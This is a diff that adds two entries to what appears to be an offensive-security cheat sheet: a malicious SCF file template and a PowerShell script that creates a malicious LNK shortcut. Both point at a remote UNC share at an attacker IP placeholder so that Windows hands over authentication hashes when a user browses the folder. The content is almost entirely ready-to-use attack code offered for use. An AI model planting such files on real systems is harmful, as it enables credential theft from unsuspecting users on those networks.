@@ -3518,6 +3518,29 @@ while($true)
 }
 ```
 
+- Malicious SCF File
+
+```
+[Shell]
+Command=2
+IconFile=\\<IP address>\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+- Malicious LNK File
+
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<IP address>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
 #9. - File Transfers
 -----------------------------------------
 
